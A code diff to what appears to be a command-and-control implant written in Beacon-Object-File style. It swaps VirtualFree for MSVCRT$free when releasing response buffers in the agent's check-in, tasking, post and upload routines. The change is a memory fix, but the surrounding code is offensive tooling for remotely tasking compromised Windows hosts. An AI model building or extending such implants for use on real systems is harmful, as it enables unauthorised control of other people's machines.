@@ -9,6 +9,8 @@ WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWO
 WINBASEAPI size_t MSVCRT$strlen(const char *str);
 WINBASEAPI char * MSVCRT$strstr(const char *str, const char *strSearch);
 
+WINBASEAPI void MSVCRT$free(void *ptr);
+
 /*
  *
  * CHECKIN LOGIC
@@ -99,8 +101,8 @@ void perform_checkin(AgentState *state, AgentCapabilities *cap, CheckinReply *re
 	// Free unneeded allocations.
 	free_checkin_request(&checkin);
 	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
-	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
-	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
+	MSVCRT$free(response.body);
+	MSVCRT$free(response.content_type);
 }
 
 /*
@@ -200,8 +202,8 @@ void perform_tasking(AgentState *state, TaskingReply *reply) {
 	// Free unneeded allocations.
 	free_tasking_request(&tasking);
 	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
-	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
-	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
+	MSVCRT$free(response.body);
+	MSVCRT$free(response.content_type);
 }
 
 /*
@@ -269,8 +271,8 @@ void perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char 
 	// Free unneeded allocations.
 	free_post_request(&post);
 	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
-	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
-	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
+	MSVCRT$free(response.body);
+	MSVCRT$free(response.content_type);
 }
 
 /*
@@ -388,6 +390,6 @@ void perform_upload(AgentState *state, UploadManager *upload) {
 	// Free unneeded allocations.
 	// Unlike the other perform_x() functions, we don't need to free the upload manager because it will be reused!
 	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
-	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
-	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);	
+	MSVCRT$free(response.body);
+	MSVCRT$free(response.content_type);
 }
